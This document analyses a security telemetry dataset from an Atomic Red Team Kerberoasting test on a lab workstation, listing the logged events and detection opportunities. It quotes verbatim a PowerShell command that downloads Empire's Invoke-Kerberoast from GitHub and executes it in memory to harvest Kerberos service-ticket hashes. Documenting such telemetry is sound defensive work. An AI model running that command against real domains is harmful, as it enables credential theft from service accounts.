# T1558.003-1: Kerberoasting — Request for service tickets

## Technique Context

Kerberoasting (T1558.003) is a credential access technique targeting Active Directory service accounts. Any authenticated domain user can request Kerberos TGS tickets for accounts that have Service Principal Names (SPNs) registered. Those tickets are encrypted with the service account's NTLM password hash and can be taken offline for dictionary or brute-force cracking — no further interaction with the domain controller is required after the ticket is obtained.

This test uses PowerShell to download and invoke the Empire project's `Invoke-Kerberoast` module directly from GitHub. The module automates SPN enumeration using LDAP and ticket requests via the .NET `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` class. This is one of the oldest and most widely recognized Kerberoasting implementations, and it is flagged by essentially every commercial and open-source AV/EDR product.

## What This Dataset Contains

The dataset spans approximately 6 seconds on 2026-03-17 from ACME-WS06 (acme.local domain) and contains 162 events across Application, PowerShell, Security, and Sysmon channels.

**The attack command**, captured verbatim in Security EID 4688 and Sysmon EID 1:
```
powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
Invoke-Kerberoast | fl}
```

**Process chain** (Security EID 4688 and Sysmon EID 1): The ART test framework spawned `whoami.exe` as its standard pre-check (tagged `technique_id=T1033,technique_name=System Owner/User Discovery` by Sysmon), then launched a child `powershell.exe` carrying the full `iex(iwr ...)` command (Sysmon tagged this `technique_id=T1083,technique_name=File and Directory Discovery`). A second `whoami.exe` and a cleanup `powershell.exe & {}` followed.

**Sysmon events include:**
- EID 7 (Image Load): 25 events — .NET CLR DLLs loaded into PowerShell (`mscoree.dll`, `clr.dll`, `mscorlib.ni.dll`) tagged `T1055/Process Injection`, plus `System.Management.Automation.ni.dll` tagged `T1059.001/PowerShell` and `wininet.dll` tagged `T1574.002/DLL Side-Loading`
- EID 10 (Process Access): PowerShell accessing child processes with handle `0x1fffff` (full access), tagged `T1055.001/Dynamic-link Library Injection`
- EID 11 (File Create): `MsMpEng.exe` writing a telemetry file to `C:\Windows\Temp\01dcb633176bfb81`, and PowerShell writing `StartupProfileData-NonInteractive` to `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\`
- EID 17 (Pipe Create): Two `\PSHost.*` named pipes created as part of PowerShell host initialization
- EID 3 (Network Connect): 1 outbound network connection event (destination details in the full dataset)
- EID 22 (DNS Query): 1 DNS query event (hostname in the full dataset, expected to be `raw.githubusercontent.com` for the IWR download)

**PowerShell channel** (116 events): 112 EID 4104 script block records, 3 EID 4103 pipeline execution records, and 1 EID 4100 pipeline error. The 4103 records show `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force` — the ART test framework standard pre-execution step. The cleanup hook is also visible: `Invoke-AtomicTest T1558.003 -TestNumbers 1 -Cleanup -Confirm:$false`. The 4100 error record is present but not from AMSI blocking — Defender was disabled via GPO for this run.

**Application channel**: EID 15 from the Windows Security Center noting Defender status as `SECURITY_PRODUCT_STATE_ON`. This is a periodic state report from the Security Center COM interface and does not indicate active scanning; it reflects the registered product state rather than real-time protection status.

## What This Dataset Does Not Contain

There are no Kerberos ticket request events (Security EID 4769) in this dataset. Despite Defender being disabled, `Invoke-Kerberoast` requires a domain environment with SPNs registered — the execution context here runs as `NT AUTHORITY\SYSTEM` on ACME-WS06, and the test infrastructure may not have SPN-bearing service accounts configured for roasting. The attack script downloaded and invoked successfully (no script-blocked error), but the LDAP enumeration returned no eligible targets or the ticket requests were not made in this environment. The Security channel contains only EID 4688 process creation events.

There are no Security EID 4768/4769 (Kerberos AS/TGS request) events. If SPNs had been present and enumerated, you would expect to see TGS-REQ and TGS-REP exchanges logged on the domain controller — those events would appear in the DC's Security log, not the workstation's.

The `Invoke-Kerberoast` module itself is not visible in the sampled script block events — only framework boilerplate 4104 blocks appear in the sample set. The full dataset contains 112 EID 4104 events, and the module code would be among them.

## Assessment

This dataset captures the full execution path of the Empire Invoke-Kerberoast attack without Defender interference. The command line carrying the IWR-to-IEX chain and the `Invoke-Kerberoast | fl` call is recorded in both Security EID 4688 and Sysmon EID 1. The PowerShell channel contains the complete execution transcript including the test framework setup. The DNS query and network connection events document the outbound fetch to GitHub.

Compared with the defended variant (datasets/art/T1558.003-1), this dataset contains substantially more events: 162 total versus 97 in the defended run. The defended dataset included a PowerShell 4100 error with `ScriptContainedMaliciousContent` and no DNS/network events because AMSI blocked the script before it could reach the download phase. Here, the download proceeds and the .NET runtime fully loads — evidenced by the 25 Sysmon EID 7 image load events versus the same count in the defended run (both load the CLR; the difference is the defended run blocked post-load).

## Detection Opportunities Present in This Data

**Command-line content** in Security EID 4688 and Sysmon EID 1 contains the string `Invoke-Kerberoast`, the Empire GitHub URL, and the `iex(iwr ...)` pattern — all of which are high-fidelity indicators when present together.

**DNS and network telemetry**: EID 22 documents a DNS query and EID 3 documents the connection — querying `raw.githubusercontent.com` from a domain-joined workstation running as SYSTEM is anomalous on its own; the subsequent connection to deliver a credential harvesting tool compounds the risk.

**PowerShell script block logging (EID 4104)**: The full 116-event PowerShell channel records the complete attack invocation. The `iex(iwr ...)` pattern, the `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` pre-requisite, and the `Invoke-Kerberoast` call are all present in the script block log.

**Sysmon EID 7 image loads**: The combination of `System.Management.Automation.ni.dll`, `wininet.dll`, and `System.IdentityModel` assemblies loading into a non-interactive PowerShell process running as SYSTEM correlates strongly with PowerShell-based credential harvesting tools that use .NET Kerberos APIs.

**Process lineage**: `powershell.exe` spawning `whoami.exe` (a pre-check pattern unique to Atomic Red Team but also common in attack frameworks), followed immediately by a second `powershell.exe` with a suspicious command line, is an anomalous parent-child relationship from a workstation running as NT AUTHORITY\SYSTEM.
